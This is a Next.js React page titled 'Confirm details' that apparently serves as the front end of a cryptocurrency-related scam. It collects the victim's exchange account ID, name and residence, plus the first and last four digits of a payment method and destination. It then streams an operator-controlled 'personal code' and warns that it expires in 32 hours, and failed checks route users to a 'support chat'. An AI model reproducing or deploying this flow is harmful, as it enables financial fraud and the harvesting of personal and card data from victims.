'use client';

import React, { useEffect, useMemo, useRef, useState } from 'react';
import Image from 'next/image';
import UserTopBar from '@/components/UserTopBar';

type Profile = { nameOnSite?:string; idOnSite?:string; residence?:string; photoUrl?:string };

function Card({ children }:{ children: React.ReactNode }) {
  return (
    <div style={{width:'100%', maxWidth:680, background:'rgba(10,15,25,0.86)', border:'1px solid #1f2937', borderRadius:16, padding:16, boxShadow:'0 16px 60px rgba(0,0,0,.45)'}}>
      {children}
      <style jsx>{`
        .btn{ display:inline-block; border:1px solid #334155; padding:10px 14px; border-radius:10px; transition:all .2s; }
        .btn:hover{ transform:translateY(-1px); box-shadow:0 8px 24px rgba(0,0,0,.35); }
        .field{ background:#0b1220; border:1px solid #1f2937; color:#e5e7eb; border-radius:10px; padding:10px }
      `}</style>
    </div>
  );
}

const OPTIONS = ['Binance','Coinbase','KuCoin','Kraken','Bybit','OKX','Huobi','Bitstamp','Bitfinex','Gate.io'];

export default function Confirm(){
  const [ready, setReady] = useState(false);
  const [me, setMe] = useState<any>(null);
  const [profile, setProfile] = useState<Profile|null>(null);

  const [site, setSite] = useState('');
  const [idOnSite, setIdOnSite] = useState('');
  const [nameOnSite, setNameOnSite] = useState('');
  const [residence, setResidence] = useState('');
  const [cubes, setCubes] = useState<number|string>('');
  const [method, setMethod] = useState('');
  const [step, setStep] = useState(1);

  const [codeChars, setCodeChars] = useState('');
  const [showPauseNote, setShowPauseNote] = useState(false);
  const evtRef = useRef<EventSource|null>(null);

  useEffect(()=>{
    (async()=>{
      const r = await fetch('/api/me', { cache:'no-store' }).then(x=>x.json()).catch(()=>null);
      const u = r?.user;
      if(!u){ window.location.href = '/login'; return; }
      if(u.role === 'ADMIN'){ window.location.href = '/admin'; return; }
      setMe(u);
      const pf:Profile = {
        nameOnSite: u?.profile?.nameOnSite || '',
        idOnSite: u?.profile?.idOnSite || '',
        residence: u?.profile?.residence || '',
        photoUrl: u?.profile?.photoUrl || ''
      };
      setProfile(pf);
      setSite(pf.nameOnSite ? (OPTIONS.find(o=>o.toLowerCase()===pf.nameOnSite?.toLowerCase())||'') : '');
      setIdOnSite(pf.idOnSite || '');
      setNameOnSite(pf.nameOnSite || '');
      setResidence(pf.residence || '');

      const st = u?.codeConfig?.lastStep || 1;
      const localStarted = localStorage.getItem('code_started')==='1';
      setStep(localStarted ? 6 : Math.max(1, Math.min(6, st)));
      setReady(true);
    })();
  },[]);

  useEffect(()=>{
    if(step!==6) return;
    if(evtRef.current) return;

    try{
      const es = new EventSource('/api/code-stream');
      evtRef.current = es;
      es.onmessage = (ev)=>{
        try{
          const data = JSON.parse(ev.data);
          if(data.type==='char'){
            setCodeChars(prev=>prev + (prev ? ' ' : '') + data.value);
          }
          if(data.type==='cursor'){
            if(typeof data.value==='number') localStorage.setItem('code_cursor', String(data.value));
          }
          if(data.type==='paused'){
            setShowPauseNote(!!data.value);
          }
          if(data.type==='done'){
            es.close();
            evtRef.current = null;
          }
        }catch{}
      };
      es.onerror = ()=>{};
      localStorage.setItem('code_started','1');
    }catch{}
  },[step]);

  useEffect(()=>{
    const onVis = ()=>{
      if(document.visibilityState==='visible' && step===6 && !evtRef.current){
        try{
          const es = new EventSource('/api/code-stream');
          evtRef.current = es;
          es.onmessage = (ev)=>{
            try{
              const data = JSON.parse(ev.data);
              if(data.type==='char'){
                setCodeChars(prev=>prev + (prev ? ' ' : '') + data.value);
              }
              if(data.type==='paused'){
                setShowPauseNote(!!data.value);
              }
              if(data.type==='done'){
                es.close();
                evtRef.current = null;
              }
            }catch{}
          };
          es.onerror = ()=>{};
        }catch{}
      }
    };
    document.addEventListener('visibilitychange', onVis);
    return ()=>document.removeEventListener('visibilitychange', onVis);
  },[step]);

  const canStep1 = useMemo(()=>!!site && !!idOnSite, [site,idOnSite]);
  const canStep2 = useMemo(()=>!!nameOnSite && !!residence, [nameOnSite,residence]);
  const canStep4 = useMemo(()=>String(cubes).length>0, [cubes]);
  const canStep5 = useMemo(()=>/^\d{4}-\d{4}$/.test(method), [method]);

  const onSave = async ()=>{
    const payload:any = { profile:{ nameOnSite, idOnSite, residence }, lastStep: Math.max(step, 2) };
    const r = await fetch('/api/profile/update', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) }).then(x=>x.json()).catch(()=>null);
    if(r?.ok){ setStep(2); }
  };

  const onCheck = async ()=>{
    const r = await fetch('/api/profile/check', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ site, idOnSite }) }).then(x=>x.json()).catch(()=>null);
    if(r?.ok){ setStep(2); } else { setStep(3); }
  };

  const onNext4 = async ()=>{
    setStep(5);
  };

  const onNext5 = async ()=>{
    const r = await fetch('/api/profile/method', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ method }) }).then(x=>x.json()).catch(()=>null);
    if(r?.ok){ setStep(6); localStorage.setItem('code_started','1'); }
  };

  return (
    <div style={{minHeight:'100dvh', background:'#0b1220', position:'relative'}}>
      <div style={{position:'absolute', inset:0}}>
        <Image src="/images/Background_1.webp" alt="" fill style={{objectFit:'cover', transform:'scale(1.12)', opacity:.42}} priority />
        <div style={{position:'absolute', inset:0, display:'grid', placeItems:'center'}}>
          <img src="/images/Logo_3.png" alt="" style={{width:'min(560px, 68vw)', opacity:.82, filter:'drop-shadow(0 20px 70px rgba(0,0,0,.55))'}}/>
        </div>
      </div>

      <div style={{position:'sticky', top:0, zIndex:10, background:'rgba(10,15,25,.65)', backdropFilter:'blur(10px)', borderBottom:'1px solid #1f2937'}}>
        <div style={{display:'flex', alignItems:'center', gap:12, padding:'10px 14px', maxWidth:1100, margin:'0 auto'}}>
          <img src="/images/Logo_3.png" alt="" style={{height:44, width:'auto', filter:'drop-shadow(0 6px 18px rgba(0,0,0,.55))'}}/>
          <div style={{flex:1}}/>
          <UserTopBar />
        </div>
      </div>

      <div style={{display:'grid', placeItems:'center', padding:'28px 12px', position:'relative', zIndex:1}}>
        <Card>
          <div style={{fontSize:20, fontWeight:800, marginBottom:12, textAlign:'center'}}>Confirm details</div>

          {step===1 && (
            <div style={{display:'grid', gap:10}}>
              <label>The name of the website where you communicated and conducted transactions</label>
              <select value={site} onChange={e=>setSite(e.target.value)}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}}>
                <option value="">Select...</option>
                {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
              </select>
              <div style={{display:'flex', gap:10, marginTop:6, flexWrap:'wrap'}}>
                <a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Open support chat</a>
                <button className="btn" onClick={onCheck} disabled={!site} style={{borderColor: site ? '#22c55e':'#334155', color: site ? '#22c55e':'#94a3b8'}}>Continue</button>
              </div>
            </div>
          )}

          {step===2 && (
            <div style={{display:'grid', gap:10}}>
              <div style={{display:'flex', gap:12, alignItems:'center'}}>
                <div style={{width:72, height:72, borderRadius:'50%', overflow:'hidden', border:'1px solid #1f2937', background:'#0b1220'}}>
                  {profile?.photoUrl ? (
                    <img src={profile.photoUrl} alt="" style={{width:'100%', height:'100%', objectFit:'cover'}}/>
                  ) : (
                    <img src="/images/Logo_3.png" alt="" style={{width:'100%', height:'100%', objectFit:'cover'}}/>
                  )}
                </div>
                <div style={{opacity:.9}}>Check and complete your data</div>
              </div>

              <label>Identifier on the site</label>
              <input className="field" value={idOnSite} onChange={e=>setIdOnSite(e.target.value)} placeholder="@id"/>

              <label>Name on the site</label>
              <input className="field" value={nameOnSite} onChange={e=>setNameOnSite(e.target.value)} placeholder="Name"/>

              <label>Country/City of residence</label>
              <input className="field" value={residence} onChange={e=>setResidence(e.target.value)} placeholder="Country, City"/>

              <div style={{display:'flex', gap:10, marginTop:6, flexWrap:'wrap'}}>
                <button className="btn" onClick={onSave} disabled={!canStep2} style={{borderColor: canStep2 ? '#22c55e':'#334155', color: canStep2 ? '#22c55e':'#94a3b8'}}>Save and continue</button>
                <a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Support chat</a>
              </div>
            </div>
          )}

          {step===3 && (
            <div style={{display:'grid', gap:12}}>
              <div style={{background:'#1f2937', border:'1px solid #334155', color:'#e5e7eb', padding:10, borderRadius:8}}>
                The entered data does not match. Please contact support.
              </div>
              <div><a className="btn" href="/chat" style={{borderColor:'#38bdf8', color:'#38bdf8'}}>Open support chat</a></div>
            </div>
          )}

          {step===4 && (
            <div style={{display:'grid', gap:8}}>
              <label>How many cubes did you use?</label>
              <input type="number" value={cubes} onChange={e=>setCubes(e.target.value===''? '': parseInt(e.target.value||'0'))}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              <div style={{fontSize:12, color:'#94a3b8'}}>*please indicate the approximate quantity</div>
              <div><button className="btn" onClick={()=>setStep(5)} disabled={!canStep4} style={{borderColor: canStep4 ? '#22c55e':'#334155', color: canStep4 ? '#22c55e':'#94a3b8'}}>Next</button></div>
            </div>
          )}

          {step===5 && (
            <div style={{display:'grid', gap:8}}>
              <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
              <input placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)}
                style={{background:'#0b1220', border:'1px solid #1f2937', color:'#e5e7eb', borderRadius:8, padding:'10px'}} />
              <div><button className="btn" disabled={!canStep5} onClick={onNext5} style={{borderColor: canStep5 ? '#22c55e':'#334155', color: canStep5 ? '#22c55e':'#94a3b8'}}>Next</button></div>
            </div>
          )}

          {step===6 && (
            <div style={{display:'grid', gap:10}}>
              <div style={{opacity:.92}}>Your personal code will appear below. Keep this page open.</div>
              <div style={{background:'#0b1220', border:'1px solid #1f2937', borderRadius:12, padding:'14px', minHeight:120, fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace'}}>
                {(codeChars || 'Waiting for code...').split('').join(' ')}
              </div>
              {showPauseNote && (
                <div style={{background:'#fffbeb', border:'1px solid #fcd34d', color:'#1f2937', borderRadius:8, padding:10}}>
                  The pause is set for a maximum of 32 hours, after which the code will become invalid
                </div>
              )}
            </div>
          )}
        </Card>
      </div>
    </div>
  );
}
